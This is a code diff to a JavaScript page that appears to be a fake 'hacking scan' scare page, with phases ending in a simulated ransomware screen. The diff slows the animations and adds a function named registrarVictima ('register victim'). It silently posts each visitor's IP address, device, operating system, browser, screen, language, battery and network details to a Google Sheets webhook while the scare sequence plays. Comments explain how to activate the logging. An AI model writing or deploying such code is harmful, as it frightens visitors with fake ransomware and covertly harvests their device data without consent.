@@ -429,30 +429,57 @@ function buildFileFeed(){
 }
 
 // ══════════════════════════════════════
-// PHASE 1 — SCAN (3s)
+// REGISTRO — Google Sheets (configurar URL abajo)
+// ══════════════════════════════════════
+// Para activar el registro:
+// 1. Crear una Google Sheet con columnas: Fecha | IP | Dispositivo | SO | Navegador | Pantalla
+// 2. Extensions > Apps Script > pegar el codigo de abajo > Deploy as Web App
+// 3. Pegar la URL del deploy aquí:
+const SHEET_WEBHOOK='';
+// Dejar vacio '' para desactivar el registro
+
+function registrarVictima(){
+  if(!SHEET_WEBHOOK)return;
+  const data={
+    fecha:new Date().toLocaleString('es-AR'),
+    ip:ipAddress,
+    dispositivo:getDeviceInfo().find(d=>d.l==='Dispositivo').v,
+    so:getDeviceInfo().find(d=>d.l==='Sistema operativo').v,
+    navegador:getDeviceInfo().find(d=>d.l==='Navegador').v,
+    pantalla:screen.width+'x'+screen.height,
+    idioma:(navigator.language||'').toUpperCase(),
+    bateria:batteryLevel,
+    red:netType
+  };
+  fetch(SHEET_WEBHOOK,{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}).catch(()=>{});
+}
+
+// ══════════════════════════════════════
+// PHASE 1 — SCAN (6s — más lento)
 // ══════════════════════════════════════
 const tasks=document.querySelectorAll('#taskList li');
 const progBar=$('progBar'),progPct=$('progPct');
 let prog=0;
 const progInt=setInterval(()=>{
-  prog+=1.2;if(prog>100)prog=100;
+  prog+=0.6;if(prog>100)prog=100;
   progBar.style.width=prog+'%';
   progPct.textContent=Math.floor(prog)+'%';
-},30);
+},35);
 
 tasks.forEach((li,i)=>{
-  setTimeout(()=>{li.classList.add('show');scanPulse()},150+i*500);
-  setTimeout(()=>li.classList.add('running'),200+i*500);
-  setTimeout(()=>{li.classList.remove('running');li.classList.add('done')},500+i*500);
+  setTimeout(()=>{li.classList.add('show');scanPulse()},400+i*1200);
+  setTimeout(()=>li.classList.add('running'),500+i*1200);
+  setTimeout(()=>{li.classList.remove('running');li.classList.add('done')},1100+i*1200);
 });
 
 // ══════════════════════════════════════
-// PHASE 2 — DEVICE INFO (3.5s)
+// PHASE 2 — DEVICE INFO (4s)
 // ══════════════════════════════════════
 setTimeout(()=>{
   clearInterval(progInt);
   progBar.style.width='100%';progPct.textContent='100%';
   vibrate([150,80,150]);
+  registrarVictima();
   setTimeout(()=>{
     goPhase('phase1','phase2');
     hexBg.classList.add('danger');
@@ -466,15 +493,15 @@ setTimeout(()=>{
       c.className='info-card';
       c.innerHTML='<div class="lbl">'+d.l+'</div><div class="val">'+d.v+'</div>';
       grid.appendChild(c);
-      setTimeout(()=>{c.classList.add('show');scanPulse()},200+i*250);
+      setTimeout(()=>{c.classList.add('show');scanPulse()},300+i*350);
     });
-  },350);
-},3000);
+  },400);
+},6000);
 
 // ══════════════════════════════════════
 // PHASE 3 — ESCALATION (5s)
 // ══════════════════════════════════════
-const P3_START=7000;
+const P3_START=10500;
 setTimeout(()=>{
   goPhase('phase2','phase3');
   flashRed(200);warningHum();
@@ -499,7 +526,7 @@ setTimeout(()=>{
 // ══════════════════════════════════════
 // PHASE 4 — RANSOMWARE (6s)
 // ══════════════════════════════════════
-const P4_START=P3_START+5800;
+const P4_START=P3_START+6000;
 setTimeout(()=>{
   goPhase('phase3','phase4');
   flashRedHard(300);alarmDrone();
